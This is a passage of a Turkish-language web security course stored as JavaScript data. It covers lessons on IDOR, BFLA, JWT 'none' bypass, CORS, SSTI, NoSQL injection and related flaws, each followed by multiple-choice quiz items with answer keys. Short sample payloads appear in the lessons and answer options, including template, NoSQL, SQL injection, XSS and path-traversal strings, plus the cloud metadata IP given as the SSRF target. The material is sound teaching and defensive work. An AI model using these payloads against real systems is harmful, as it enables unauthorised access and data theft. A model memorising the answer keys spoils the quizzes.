a\u011Fdan yetkisiz istekler yapt\u0131rmak","Veritaban\u0131na do\u011Frudan SQL enjekte etmek","Taray\u0131c\u0131y\u0131 kilitlemek"],correct:1},{q:"Bulut ortamlar\u0131nda (\xF6rn. AWS) SSRF zafiyeti s\xF6m\xFCr\xFClerek ge\xE7ici eri\u015Fim anahtarlar\u0131n\u0131 \xE7almak i\xE7in s\u0131kl\u0131kla hedef al\u0131nan standart metadata IP adresi hangisidir?",options:["127.0.0.1","192.168.1.1","169.254.169.254","8.8.8.8"],correct:2},{q:"SSRF zafiyetini \xF6nlemek i\xE7in girdiler kontrol edilirken ne yap\u0131lmal\u0131d\u0131r?",options:["Sadece URL uzunlu\u011Funa bak\u0131lmal\u0131d\u0131r","\u0130stek at\u0131labilecek g\xFCvenli alan adlar\u0131n\u0131 i\xE7eren s\u0131k\u0131 bir izin listesi (whitelist) uygulanmal\u0131d\u0131r","Hi\xE7bir d\u0131\u015F iste\u011Fe izin verilmemelidir","Sadece HTTPS kullan\u0131lmal\u0131d\u0131r"],correct:1}]},{id:"uyg-18",title:"Broken Authentication",content:"<h2>Broken Authentication (Kimlik Do\u011Frulama Hatalar\u0131)</h2><p>Kimlik do\u011Frulama mekanizmalar\u0131ndaki yap\u0131land\u0131rma hatalar\u0131 ve zay\u0131fl\u0131klar, sald\u0131rganlar\u0131n kullan\u0131c\u0131 hesaplar\u0131n\u0131 ele ge\xE7irmesine (Account Takeover) olanak tan\u0131r.</p><p>S\u0131k Kar\u015F\u0131la\u015F\u0131lan Hatalar:</p><ul><li>Kaba kuvvet (Brute-force) ve kimlik bilgisi doldurma (Credential Stuffing) sald\u0131r\u0131lar\u0131na kar\u015F\u0131 koruma (Rate Limiting) olmamas\u0131.</li><li>\xC7ok zay\u0131f \u015Fifre politikalar\u0131 (\xF6rn: 123456 \u015Fifresine izin verilmesi).</li><li>Oturum kimliklerinin (Session ID) g\xFCvenli olmayan \u015Fekilde y\xF6netilmesi, URL'lerde ta\u015F\u0131nmas\u0131 veya oturum kapat\u0131ld\u0131\u011F\u0131nda sunucuda ge\xE7ersiz k\u0131l\u0131nmamas\u0131.</li></ul>",example:"<h3>Sald\u0131r\u0131 Y\xF6ntemi:</h3><p>Bir web sitesinin giri\u015F panelinde Rate Limit (istek s\u0131n\u0131rlamas\u0131) yoksa, sald\u0131rgan Burp Suite Intruder ile dakikada binlerce \u015Fifre deneyerek kullan\u0131c\u0131 hesaplar\u0131n\u0131 kolayca ele ge\xE7irebilir.</p>",questions:[{q:"A\u015Fa\u011F\u0131dakilerden hangisi Broken Authentication (Kimlik Do\u011Frulama Hatalar\u0131) kapsam\u0131na girer?",options:["SQL enjeksiyonu a\xE7\u0131\u011F\u0131","Giri\u015F panelinde kaba kuvvet (brute-force) korumas\u0131n\u0131n olmamas\u0131","XSS a\xE7\u0131\u011F\u0131","CSS dosyalar\u0131n\u0131n y\xFCklenememesi"],correct:1},{q:"Giri\u015F denemelerini s\u0131n\u0131rland\u0131rmak ve kaba kuvvet sald\u0131r\u0131lar\u0131n\u0131 engellemek i\xE7in kullan\u0131lan teknoloji hangisidir?",options:["Encryption","Rate Limiting (\u0130stek S\u0131n\u0131rland\u0131rma)","Hashing","Obfuscation"],correct:1},{q:"Kullan\u0131c\u0131n\u0131n \xE7\u0131k\u0131\u015F yapt\u0131ktan sonra session token'\u0131n\u0131n sunucuda silinmemesi ne t\xFCr bir riske yol a\xE7ar?",options:["Web sunucusunun yava\u015Flamas\u0131na","Sald\u0131rgan\u0131n eski token'\u0131 ele ge\xE7irerek kurban\u0131n hesab\u0131na tekrar eri\u015Febilmesine (Session Hijacking)","IP adresinin de\u011Fi\u015Fmesine","\u015Eifrenin silinmesine"],correct:1}]},{id:"uyg-19",title:"BOLA / IDOR Zafiyeti",content:"<h2>BOLA / IDOR Zafiyeti</h2><p><strong>BOLA (Broken Object Level Authorization)</strong> veya di\u011Fer ad\u0131yla <strong>IDOR (Insecure Direct Object Reference)</strong>, uygulaman\u0131n kullan\u0131c\u0131dan ald\u0131\u011F\u0131 bir nesne tan\u0131mlay\u0131c\u0131y\u0131 (ID, dosya ad\u0131 vb.) arka planda yetki kontrol\xFC yapmadan do\u011Frudan veritaban\u0131 sorgusuna veya dosya sistemine g\xF6ndermesi sonucu olu\u015Fur.</p><p>Kullan\u0131c\u0131, istekteki kendi ID bilgisini ba\u015Fka bir kullan\u0131c\u0131n\u0131n ID bilgisiyle de\u011Fi\u015Ftirerek yetkisiz verilere eri\u015Febilir veya bunlar\u0131 de\u011Fi\u015Ftirebilir.</p>",example:"<h3>\u0130stek Analizi:</h3><p>Fatura g\xF6r\xFCnt\xFCleme linki: <code>https://site.com/invoice?id=1005</code><br/>Sald\u0131rgan parametreyi de\u011Fi\u015Ftirir: <code>https://site.com/invoice?id=1006</code><br/>E\u011Fer uygulama kullan\u0131c\u0131n\u0131n 1006 nolu faturay\u0131 g\xF6rmeye yetkili olup olmad\u0131\u011F\u0131n\u0131 kontrol etmiyorsa BOLA/IDOR zafiyeti vard\u0131r.</p>",questions:[{q:"BOLA/IDOR zafiyetinin temel ortaya \xE7\u0131k\u0131\u015F nedeni nedir?",options:["Veritaban\u0131 \u015Fifresinin \xE7al\u0131nmas\u0131","Kullan\u0131c\u0131dan gelen nesne referans\u0131 (ID vb.) isteklerinde sunucu taraf\u0131nda yetki/sahiplik kontrol\xFC yap\u0131lmamas\u0131","Taray\u0131c\u0131n\u0131n \xE7\xF6kmesi","SSL sertifikas\u0131n\u0131n olmamas\u0131"],correct:1},{q:"Bir e-ticaret sitesinde sipari\u015F detay\u0131 linkindeki '?order_id=55' de\u011Ferini '?order_id=56' yaparak ba\u015Fkas\u0131n\u0131n sipari\u015Fini g\xF6rmek hangi zafiyete \xF6rnektir?",options:["XSS","SQLi","IDOR / BOLA","CSRF"],correct:2},{q:"IDOR zafiyetlerini engellemek i\xE7in ne yap\u0131lmal\u0131d\u0131r?",options:["ID de\u011Ferlerini tamamen gizlemek","Her nesne eri\u015Fim iste\u011Finde, oturum a\xE7m\u0131\u015F kullan\u0131c\u0131n\u0131n o nesneye (objeye) eri\u015Fim izni olup olmad\u0131\u011F\u0131n\u0131 sunucu taraf\u0131nda do\u011Frulamak","Sadece POST istekleri kullanmak","B\xFCt\xFCn ID'leri silmek"],correct:1}]},{id:"uyg-20",title:"Broken Function Level Authorization (BFLA)",content:"<h2>Broken Function Level Authorization (BFLA)</h2><p>BFLA, uygulaman\u0131n hassas i\u015Flevleri ve fonksiyonlar\u0131 (\xF6rn: admin paneline eri\u015Fim, kullan\u0131c\u0131 silme, ayarlara eri\u015Fim) sadece istemci taraf\u0131nda (gizleyerek veya men\xFCy\xFC g\xF6stermeyerek) korumas\u0131, ancak sunucu taraf\u0131nda yetki denetimi yapmamas\u0131 durumudur.</p><p>Sald\u0131rgan, admin panelinin URL'ini (\xF6rn: `/admin/deleteUser`) tahmin ederek veya API u\xE7 noktas\u0131n\u0131 do\u011Frudan \xE7a\u011F\u0131rarak normal kullan\u0131c\u0131 hesab\u0131 ile admin yetkisine sahip fonksiyonlar\u0131 \xE7al\u0131\u015Ft\u0131rabilir.</p>",example:"<h3>Sald\u0131r\u0131 \xD6rne\u011Fi:</h3><p>Normal kullan\u0131c\u0131: <code>https://site.com/profile</code> sayfas\u0131nda i\u015Flem yap\u0131yor.<br/>Sald\u0131rgan taray\u0131c\u0131dan do\u011Frudan admin API ucunu \xE7a\u011F\u0131r\u0131r: <code>POST /api/v1/admin/users/1/delete</code>. Sunucu kullan\u0131c\u0131n\u0131n rol\xFCn\xFC (admin olup olmad\u0131\u011F\u0131n\u0131) kontrol etmeden iste\u011Fi i\u015Flerse BFLA s\xF6m\xFCr\xFClm\xFC\u015F olur.</p>",questions:[{q:"BFLA (Broken Function Level Authorization) zafiyetinin IDOR'dan en temel fark\u0131 nedir?",options:["Veritaban\u0131n\u0131 kilitlemesi","BOLA nesne (veri) baz\u0131nda yetki hatas\u0131yken, BFLA fonksiyonel (admin paneli i\u015Flemleri, API u\xE7 noktalar\u0131 vb.) yetki hatas\u0131d\u0131r","Sadece mobil uygulamalarda g\xF6r\xFClmesi","\u015Eifre k\u0131rma sald\u0131r\u0131s\u0131 olmas\u0131"],correct:1},{q:"Admin men\xFCs\xFCn\xFCn normal kullan\u0131c\u0131lara g\xF6sterilmeyip gizlenmesi, BFLA zafiyetini engellemek i\xE7in yeterli bir g\xFCvenlik \xF6nlemi midir?",options:["Evet, kullan\u0131c\u0131 g\xF6rmedi\u011Fi i\xE7in eri\u015Femez","Hay\u0131r, sald\u0131rgan API u\xE7 noktalar\u0131n\u0131 veya URL'leri tahmin edip do\u011Frudan \xE7a\u011F\u0131rabilir. Do\u011Frulama mutlaka sunucu taraf\u0131nda yap\u0131lmal\u0131d\u0131r","Sadece HTTPS aktifse yeterlidir","Sadece \u015Fifreler karma\u015F\u0131ksa yeterlidir"],correct:1},{q:"Sunucu taraf\u0131nda BFLA'y\u0131 \xF6nlemek i\xE7in hangi g\xFCvenlik kontrol\xFC mekanizmas\u0131 uygulanmal\u0131d\u0131r?",options:["IP k\u0131s\u0131tlamas\u0131","Rol Tabanl\u0131 Eri\u015Fim Kontrol\xFC (RBAC - Role-Based Access Control)","Sadece JavaScript \u015Fifrelemesi","Dosya boyutu s\u0131n\u0131r\u0131"],correct:1}]},{id:"uyg-21",title:"Hassas Veri \u0130f\u015Fas\u0131 (Sensitive Data Exposure)",content:"<h2>Hassas Veri \u0130f\u015Fas\u0131 (Sensitive Data Exposure)</h2><p>Hassas Veri \u0130f\u015Fas\u0131, uygulaman\u0131n kritik bilgileri (\u015Fifreler, kredi kartlar\u0131, ki\u015Fisel sa\u011Fl\u0131k verileri, API anahtarlar\u0131) \u015Fifrelemeden a\xE7\u0131k metin (cleartext) olarak saklamas\u0131, a\u011Fda \u015Fifresiz iletmesi veya hata mesajlar\u0131nda s\u0131zd\u0131rmas\u0131 durumudur.</p><p>G\xFCvenlik A\xE7\u0131\u011F\u0131 Durumlar\u0131:</p><ul><li>Veritaban\u0131ndaki kullan\u0131c\u0131 \u015Fifrelerinin hashlenmeden (a\xE7\u0131k metin) tutulmas\u0131.</li><li>HTTPS yerine \u015Fifresiz HTTP kullan\u0131larak kredi kart\u0131 bilgilerinin a\u011F \xFCzerinden g\xF6nderilmesi.</li><li>Zay\u0131f kriptografik algoritmalar\u0131n (MD5, SHA1) kullan\u0131lmas\u0131.</li></ul>",example:"<h3>Kriptografik Hata:</h3><p>Bir e-ticaret veritaban\u0131 s\u0131zd\u0131r\u0131ld\u0131\u011F\u0131nda \u015Fifrelerin MD5 ile hashlenmi\u015F olmas\u0131, sald\u0131rganlar\u0131n g\xF6kku\u015Fa\u011F\u0131 tablolar\u0131 (Rainbow Tables) kullanarak \u015Fifreleri saniyeler i\xE7inde k\u0131rmas\u0131na yol a\xE7ar. \u015Eifreler tuzlanm\u0131\u015F (salted) g\xFC\xE7l\xFC algoritmalarla (bcrypt, Argon2) hashlenmelidir.</p>",questions:[{q:"A\u015Fa\u011F\u0131dakilerden hangisi Hassas Veri \u0130f\u015Fas\u0131 zafiyetine bir \xF6rnektir?",options:["SQL enjeksiyonu a\xE7\u0131\u011F\u0131","Kullan\u0131c\u0131 \u015Fifrelerinin veritaban\u0131nda a\xE7\u0131k metin (cleartext) olarak saklanmas\u0131","XSS a\xE7\u0131\u011F\u0131","\xC7ok fakt\xF6rl\xFC kimlik do\u011Frulama kullan\u0131lmas\u0131"],correct:1},{q:"Veritaban\u0131ndaki kullan\u0131c\u0131 \u015Fifrelerini g\xFCvenli bir \u015Fekilde saklamak i\xE7in a\u015Fa\u011F\u0131daki y\xF6ntemlerden hangisi tercih edilmelidir?",options:["MD5 \u015Fifreleme","Bcrypt veya Argon2 gibi g\xFC\xE7l\xFC ve tuzlanm\u0131\u015F (salted) \xF6zetleme (hashing) algoritmalar\u0131","AES asimetrik \u015Fifreleme","Base64 kodlama"],correct:1},{q:"A\u011F \xFCzerinden hassas verilerin ta\u015F\u0131nmas\u0131 s\u0131ras\u0131nda if\u015Fay\u0131 \xF6nlemek i\xE7in hangi protokol\xFCn kullan\u0131lmas\u0131 zorunludur?",options:["HTTP","HTTPS / TLS","Telnet","FTP"],correct:1}]},{id:"uyg-22",title:"G\xFCvenlik Yap\u0131land\u0131rma Hatalar\u0131",content:"<h2>Security Misconfiguration (G\xFCvenlik Yap\u0131land\u0131rma Hatalar\u0131)</h2><p>G\xFCvenlik Yap\u0131land\u0131rma Hatalar\u0131, sunucu, uygulama, veritaban\u0131 veya framework ayarlar\u0131n\u0131n varsay\u0131lan (default) de\u011Ferlerde b\u0131rak\u0131lmas\u0131 veya g\xFCvensiz yap\u0131land\u0131r\u0131lmas\u0131 sonucu ortaya \xE7\u0131kar.</p><p>Tipik Yap\u0131land\u0131rma Hatalar\u0131:</p><ul><li>Giri\u015F panellerinde varsay\u0131lan kullan\u0131c\u0131 ad\u0131/\u015Fifrelerin (admin/admin, root/root) b\u0131rak\u0131lmas\u0131.</li><li>Detayl\u0131 hata mesajlar\u0131n\u0131n (Stack Trace) son kullan\u0131c\u0131ya g\xF6sterilmesi (sald\u0131rganlar sunucu dizinlerini ve framework versiyonlar\u0131n\u0131 buradan \xF6\u011Frenir).</li><li>Kullan\u0131lmayan servislerin, portlar\u0131n veya \xF6rnek sayfalar\u0131n sunucuda aktif b\u0131rak\u0131lmas\u0131.</li></ul>",example:"<h3>\xD6rnek Risk:</h3><p>Bir Apache web sunucusunda <code>Directory Listing</code> (Dizin Listeleme) \xF6zelli\u011Finin a\xE7\u0131k b\u0131rak\u0131lmas\u0131, sald\u0131rgan\u0131n `/uploads/` veya `/configs/` dizinindeki t\xFCm dosyalar\u0131 taray\u0131c\u0131dan listeleyip indirmesine izin verir.</p>",questions:[{q:"A\u015Fa\u011F\u0131dakilerden hangisi bir G\xFCvenlik Yap\u0131land\u0131rma Hatas\u0131 (Security Misconfiguration) \xF6rne\u011Fidir?",options:["Parametrik sorgu kullanmak","Sunucuda varsay\u0131lan (default) y\xF6netim \u015Fifrelerinin de\u011Fi\u015Ftirilmeden b\u0131rak\u0131lmas\u0131","Girdileri filtrelemek","Anti-CSRF token kullanmak"],correct:1},{q:"Uygulaman\u0131n hata an\u0131nda kullan\u0131c\u0131ya detayl\u0131 hata kodlar\u0131n\u0131 ve stack trace (hata izi) bilgilerini g\xF6stermesinin g\xFCvenlik a\xE7\u0131s\u0131ndan riski nedir?",options:["Sayfay\u0131 yava\u015Flatmas\u0131","Sald\u0131rgana sunucu dosya yollar\u0131, veritaban\u0131 yap\u0131s\u0131 ve kullan\u0131lan k\xFCt\xFCphane versiyonlar\u0131 gibi kritik ke\u015Fif bilgileri sa\u011Flamas\u0131","Tasar\u0131m\u0131 bozmas\u0131","Oturumu kapatmas\u0131"],correct:1},{q:"Web sunucusunda dizin i\xE7eri\u011Finin listelenmesini (Directory Listing) engellemek i\xE7in ne yap\u0131lmal\u0131d\u0131r?",options:["Sunucu kapat\u0131lmal\u0131","Sunucu konfig\xFCrasyon dosyas\u0131ndan dizin listeleme \xF6zelli\u011Fi (Indexes) kapat\u0131lmal\u0131","T\xFCm dosyalar \u015Fifrelenmeli","Yeni portlar a\xE7\u0131lmal\u0131"],correct:1}]},{id:"uyg-23",title:"CORS A\xE7\u0131kl\u0131klar\u0131",content:"<h2>Cross-Origin Resource Sharing (CORS) A\xE7\u0131kl\u0131klar\u0131</h2><p>Taray\u0131c\u0131lar varsay\u0131lan olarak **Same-Origin Policy (SOP - Ayn\u0131 K\xF6ken Politikas\u0131)** uygular: Bir sitedeki JavaScript kodlar\u0131, ba\u015Fka bir sitenin verilerini okuyamaz. CORS ise bu k\u0131s\u0131tlamay\u0131 esneterek g\xFCvenli veri payla\u015F\u0131m\u0131n\u0131 sa\u011Flayan HTTP ba\u015Fl\u0131klar\u0131 mekanizmas\u0131d\u0131r.</p><p><strong>G\xFCvenlik A\xE7\u0131\u011F\u0131:</strong> E\u011Fer sunucu CORS ba\u015Fl\u0131\u011F\u0131nda <code>Access-Control-Allow-Origin: *</code> (herkese izin ver) ve <code>Access-Control-Allow-Credentials: true</code> (\xE7erezleri de kabul et) tan\u0131mlarsa, sald\u0131rgan\u0131n sitesi kurban\u0131n ad\u0131na hedef uygulamadan veri okuyabilir.</p>",example:"<h3>Sald\u0131r\u0131 Ak\u0131\u015F\u0131:</h3><p>Kurban banka sitesinde oturum a\xE7m\u0131\u015Fken sald\u0131rgan\u0131n sitesine girer. Sald\u0131rgan\u0131n sitesindeki JS kodu, bankan\u0131n API'sine istek atar. Yanl\u0131\u015F yap\u0131land\u0131r\u0131lm\u0131\u015F CORS nedeniyle banka verileri sald\u0131rgan\u0131n JS koduna teslim eder.</p>",questions:[{q:"Taray\u0131c\u0131lar\u0131n, farkl\u0131 sitelerin birbirinin verisini okumas\u0131n\u0131 engelleyen temel g\xFCvenlik politikas\u0131 hangisidir?",options:["CORS","Same-Origin Policy (SOP - Ayn\u0131 K\xF6ken Politikas\u0131)","CSRF","XSS"],correct:1},{q:"CORS yap\u0131land\u0131rmas\u0131nda hangi ba\u015Fl\u0131k de\u011Ferinin '*' (wildcard) olarak ayarlanmas\u0131 ve kimlik do\u011Frulamaya izin verilmesi ciddi g\xFCvenlik riskidir?",options:["Access-Control-Allow-Methods","Access-Control-Allow-Origin","Access-Control-Max-Age","Content-Type"],correct:1},{q:"CORS g\xFCvenlik a\xE7\u0131klar\u0131ndan korunmak i\xE7in sunucu taraf\u0131nda ne yap\u0131lmal\u0131d\u0131r?",options:["T\xFCm CORS istekleri engellenmeli","Origin ba\u015Fl\u0131\u011F\u0131 kontrol edilmeli ve sadece g\xFCvenilir, belirli alan adlar\u0131na izin listesi (whitelist) uygulanmal\u0131d\u0131r","Sadece HTTP kullan\u0131lmal\u0131","\xC7erezler tamamen silinmeli"],correct:1}]},{id:"uyg-24",title:"JWT G\xFCvenli\u011Fi ve Manip\xFClasyonu",content:"<h2>JWT (JSON Web Token) G\xFCvenli\u011Fi</h2><p>JWT, istemci ve sunucu aras\u0131nda g\xFCvenli veri transferi sa\u011Flayan, nokta i\u015Faretleriyle ayr\u0131lm\u0131\u015F 3 par\xE7al\u0131 (Header.Payload.Signature) bir token standard\u0131d\u0131r.</p><p>Sald\u0131rganlar\u0131n uygulad\u0131\u011F\u0131 manip\xFClasyon y\xF6ntemleri:</p><ul><li><strong>None Algoritmas\u0131 Bypass:</strong> Token ba\u015Fl\u0131\u011F\u0131ndaki `alg` alan\u0131 `none` yap\u0131l\u0131r ve imza k\u0131sm\u0131 silinir. K\xF6t\xFC yaz\u0131lm\u0131\u015F sunucular imzay\u0131 do\u011Frulamadan token'\u0131 kabul edebilir.</li><li><strong>Zay\u0131f Gizli Anahtar (Secret Key):</strong> \u0130mzalama anahtar\u0131 zay\u0131fsa (\xF6rn: `secret`), sald\u0131rganlar Hashcat gibi ara\xE7larla anahtar\u0131 \xE7evrimd\u0131\u015F\u0131 k\u0131r\u0131p kendi sahte admin token'lar\u0131n\u0131 imzalayabilir.</li></ul>",example:"<h3>JWT Par\xE7alama:</h3><p>\xD6rnek Token: <code>eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYW5nIn0.signature</code><br/>\u0130lk k\u0131s\u0131m Header (algoritma bilgisi), ikinci k\u0131s\u0131m Payload (kullan\u0131c\u0131 bilgileri), \xFC\xE7\xFCnc\xFC k\u0131s\u0131m ise do\u011Frulama imzas\u0131d\u0131r.</p>",questions:[{q:"JWT (JSON Web Token) yap\u0131s\u0131nda nokta (.) karakteriyle ayr\u0131lm\u0131\u015F 3 ana b\xF6l\xFCm s\u0131ras\u0131yla hangileridir?",options:["Signature, Payload, Header","Header, Payload, Signature","Payload, Header, Key","User, Role, Hash"],correct:1},{q:"JWT manip\xFClasyonunda 'None algoritmas\u0131' sald\u0131r\u0131s\u0131 nas\u0131l \xE7al\u0131\u015F\u0131r?",options:["Kullan\u0131c\u0131 \u015Fifresini silerek","Token ba\u015Fl\u0131\u011F\u0131ndaki algoritma t\xFCr\xFCn\xFC 'none' yap\u0131p imza do\u011Frulamay\u0131 devre d\u0131\u015F\u0131 b\u0131rakmay\u0131 hedefleyerek","Token boyutunu b\xFCy\xFCterek","Yeni port a\xE7arak"],correct:1},{q:"JWT'lerin g\xFCvenli\u011Fini sa\u011Flamak i\xE7in imzalama a\u015Famas\u0131nda ne kullan\u0131lmal\u0131d\u0131r?",options:["Zay\u0131f tahmin edilebilir anahtarlar","Karma\u015F\u0131k, uzun ve y\xFCksek entropili g\xFC\xE7l\xFC gizli anahtarlar (Strong Secret Keys)","Base64 \u015Fifreleme","Hi\xE7bir anahtar kullan\u0131lmamal\u0131d\u0131r"],correct:1}]},{id:"uyg-25",title:"Clickjacking Sald\u0131r\u0131s\u0131 ve Savunma",content:"<h2>Clickjacking (T\u0131k Tuza\u011F\u0131)</h2><p>Clickjacking, bir sald\u0131rgan\u0131n kurban\u0131 g\xF6r\xFCnmez veya \u015Feffaf bir \xE7er\xE7eveye (iframe) t\u0131klamaya y\xF6nlendirerek, kullan\u0131c\u0131n\u0131n asl\u0131nda ba\u015Fka bir sitede (\xF6rn. sosyal medya hesab\u0131, banka ayarlar\u0131) istem d\u0131\u015F\u0131 bir i\u015Flem ger\xE7ekle\u015Ftirmesini sa\u011Flayan aray\xFCz manip\xFClasyon sald\u0131r\u0131s\u0131d\u0131r.</p><p>Sald\u0131rgan, hedef siteyi kendi haz\u0131rlad\u0131\u011F\u0131 web sayfas\u0131n\u0131n i\xE7ine <code>&lt;iframe&gt;</code> olarak g\xF6mer ve bu \xE7er\xE7evenin g\xF6r\xFCn\xFCrl\xFC\u011F\xFCn\xFC CSS ile `%0` yapar (tamamen \u015Feffaf). Kurban kendi g\xF6rd\xFC\u011F\xFC d\xFC\u011Fmelere t\u0131klad\u0131\u011F\u0131n\u0131 san\u0131rken, arkadaki g\xF6r\xFCnmez sitenin d\xFC\u011Fmelerine t\u0131klar.</p>",example:"<h3>\xD6nleme Parametresi:</h3><p>Web sunucular\u0131nda <strong>`X-Frame-Options: DENY`</strong> veya <strong>`SAMEORIGIN`</strong> ba\u015Fl\u0131\u011F\u0131 kullan\u0131larak sitenin ba\u015Fka siteler i\xE7inde iframe olarak g\xF6m\xFClmesi engellenir.</p>",questions:[{q:"Kullan\u0131c\u0131n\u0131n \u015Feffaf bir iframe \xFCzerindeki g\xF6r\xFCnmez \xF6\u011Felere t\u0131klat\u0131larak istem d\u0131\u015F\u0131 i\u015Flemler yapt\u0131r\u0131ld\u0131\u011F\u0131 sald\u0131r\u0131 t\xFCr\xFC hangisidir?",options:["CSRF","XSS","Clickjacking (T\u0131k Tuza\u011F\u0131)","BOLA"],correct:2},{q:"Web sitenizin ba\u015Fka siteler i\xE7inde iframe olarak g\xF6m\xFClmesini (clickjacking sald\u0131r\u0131s\u0131n\u0131) engellemek i\xE7in kullan\u0131lan HTTP yan\u0131t ba\u015Fl\u0131\u011F\u0131 hangisidir?",options:["X-XSS-Protection","X-Frame-Options","Content-Type","Server"],correct:1},{q:"X-Frame-Options ba\u015Fl\u0131\u011F\u0131ndaki 'SAMEORIGIN' de\u011Feri neyi ifade eder?",options:["Sitenin hi\xE7bir \u015Fekilde iframe i\xE7inde a\xE7\u0131lamayaca\u011F\u0131n\u0131","Sitenin sadece kendi alan ad\u0131 alt\u0131ndaki sayfalarda iframe i\xE7inde a\xE7\u0131labilece\u011Fini","Sitenin her yerde a\xE7\u0131labilece\u011Fini","Sitenin \u015Fifrelendi\u011Fini"],correct:1}]},{id:"uyg-26",title:"SSTI (Server-Side Template Injection)",content:"<h2>Server-Side Template Injection (SSTI)</h2><p>SSTI, web uygulamalar\u0131n\u0131n dinamik i\xE7erik \xFCretmek i\xE7in \u015Fablon motorlar\u0131n\u0131 (Template Engines - Jinja2, Twig, FreeMarker vb.) kulland\u0131\u011F\u0131 durumlarda ortaya \xE7\u0131kan ciddi bir enjeksiyon a\xE7\u0131\u011F\u0131d\u0131r.</p><p>Uygulama, kullan\u0131c\u0131 girdilerini \u015Fablon yap\u0131s\u0131yla do\u011Frudan birle\u015Ftirip sunucuda i\u015Flerse, sald\u0131rgan \u015Fablon kodlar\u0131 enjekte edebilir. Bu durum \u015Fablon motorunun g\xFCc\xFCn\xFC kullanarak sunucu \xFCzerinde yerel dosya okuma ve do\u011Frudan **RCE (Uzaktan Kod \xC7al\u0131\u015Ft\u0131rma)** elde etmeye yol a\xE7ar.</p>",example:"<h3>Jinja2 (Python) Testi:</h3><p>Arama parametresine <code>{{ 7 * 7 }}</code> yaz\u0131ld\u0131\u011F\u0131nda, sunucu yan\u0131t olarak <code>49</code> de\u011Ferini d\xF6nerse SSTI zafiyeti do\u011Frulanm\u0131\u015F olur.</p>",questions:[{q:"\u015Eablon motorlar\u0131n\u0131n (Template Engines) g\xFCc\xFCn\xFC suistimal ederek sunucuda uzaktan kod \xE7al\u0131\u015Ft\u0131r\u0131lmas\u0131n\u0131 (RCE) sa\u011Flayan enjeksiyon t\xFCr\xFC hangisidir?",options:["SQL Injection","SSTI (Server-Side Template Injection)","XHTML Injection","LDAP Injection"],correct:1},{q:"A\u015Fa\u011F\u0131daki payload'lardan hangisi Jinja2 veya Twig \u015Fablon motorlar\u0131nda SSTI testi yapmak i\xE7in s\u0131k\xE7a kullan\u0131l\u0131r?",options:["' OR 1=1--","<script>alert(1)<\/script>","{{ 7 * 7 }}","../etc/passwd"],correct:2},{q:"SSTI zafiyetini \xF6nlemek i\xE7in ne yap\u0131lmal\u0131d\u0131r?",options:["T\xFCm girdileri kald\u0131rmak","Kullan\u0131c\u0131 verilerini asla \u015Fablon yap\u0131s\u0131yla do\u011Frudan birle\u015Ftirmemek, \u015Fablon motorlar\u0131n\u0131n g\xFCvenli parametrik ba\u011Flama \xF6zelliklerini kullanmak","Sadece PHP kullanmak","Sunucuyu kapatmak"],correct:1}]},{id:"uyg-27",title:"NoSQL Injection",content:"<h2>NoSQL Injection ve Mant\u0131ksal Operat\xF6r Enjeksiyonu</h2><p>NoSQL veritabanlar\u0131 (\xF6rn. MongoDB) geleneksel SQL dili yerine JSON tabanl\u0131 nesne sorgular\u0131 kullan\u0131r. Ancak girdiler g\xFCvenli olmayan \u015Fekilde sorgu nesnesiyle birle\u015Ftirilirse <strong>NoSQL Injection</strong> zafiyeti olu\u015Fur.</p><p>Sald\u0131rganlar, veritaban\u0131 filtrelerini a\u015Fmak i\xE7in mant\u0131ksal operat\xF6rleri enjekte ederler. En s\u0131k kullan\u0131lan operat\xF6rler:</p><ul><li>`$ne`: E\u015Fit de\u011Fil (Not Equal)</li><li>`$gt`: B\xFCy\xFCkt\xFCr (Greater Than)</li></ul>",example:`<h3>Zafiyetli Express/MongoDB Giri\u015F Paneli:</h3><pre><code>db.users.find({ username: req.body.username, password: req.body.password })</code></pre><p>Sald\u0131rgan \u015Fifre parametresini JSON nesnesi olarak g\xF6nderir: <code>{ "$ne": "xyz" }</code>. Bu durumda \u015Fifresi 'xyz' olmayan ilk kullan\u0131c\u0131yla giri\u015F yap\u0131l\u0131r.</p>`,questions:[{q:"NoSQL Injection sald\u0131r\u0131lar\u0131nda, giri\u015F panelini bypass etmek i\xE7in s\u0131kl\u0131kla enjekte edilen '$ne' operat\xF6r\xFCn\xFCn anlam\u0131 nedir?",options:["E\u015Fittir (Equal)","E\u015Fit De\u011Fildir (Not Equal)","B\xFCy\xFCkt\xFCr (Greater Than)","K\xFC\xE7\xFCkt\xFCr (Less Than)"],correct:1},{q:"A\u015Fa\u011F\u0131daki veritaban\u0131 sistemlerinden hangisi NoSQL Injection sald\u0131r\u0131lar\u0131n\u0131n do\u011Frudan hedefi olabilir?",options:["MySQL","PostgreSQL","MongoDB","MSSQL"],correct:2},{q:"NoSQL enjeksiyon a\xE7\u0131klar\u0131n\u0131 engellemek i\xE7in kod yazarken ne yap\u0131lmal\u0131d\u0131r?",options:["Sorgu stringlerini birle\u015Ftirmek","Kullan\u0131c\u0131 girdilerini JSON nesneleri olarak do\u011Frudan sorguya sokmak yerine, girdileri \u015Fema kurallar\u0131na g\xF6re kat\u0131 tiplere d\xF6n\xFC\u015Ft\xFCrmek (casting) veya sanitize etmek","SQL veritaban\u0131na ge\xE7mek","Hi\xE7bir filtre kullanmamak"],correct:1}]},{id:"uyg-28",title:"API G\xFCvenli\u011Fi ve H\u0131z S\u0131n\u0131rlamas\u0131",content:"<h2>API G\xFCvenli\u011Fi ve H\u0131z S\u0131n\u0131rlamas\u0131 (Rate Limiting)</h2><p>Modern web ve mobil uygulamalar arka planda REST veya GraphQL API'leri ile haberle\u015Fir. API'ler do\u011Frudan d\u0131\u015Far\u0131ya a\xE7\u0131k olduklar\u0131 i\xE7in sald\u0131rganlar\u0131n birincil hedefidir.</p><p><strong>H\u0131z S\u0131n\u0131rlamas\u0131 (Rate Limiting) Eksikli\u011Fi:</strong> Bir API ucuna (\xF6rn: `/api/v1/auth/login` veya `/api/v1/sms/send`) dakikada s\u0131n\u0131rs\u0131z say\u0131da istek at\u0131lmas\u0131 durumudur. Sald\u0131rganlar bu sayede kolayca kaba kuvvet, brute-force veya SMS bombalama (spam) sald\u0131r\u0131s\u0131 yapabilir.</p>",example:"<h3>\xC7\xF6z\xFCm:</h3><p>API sunucular\u0131nda IP veya kullan\u0131c\u0131 token'\u0131 ba\u015F\u0131na bir h\u0131z s\u0131n\u0131r\u0131 (\xF6rn: 1 dakikada en fazla 60 istek) tan\u0131mlanarak otomatik istekler ve sald\u0131r\u0131 ara\xE7lar\u0131 engellenir.</p>",questions:[{q:"API u\xE7 noktalar\u0131nda Rate Limiting (H\u0131z S\u0131n\u0131rlamas\u0131) 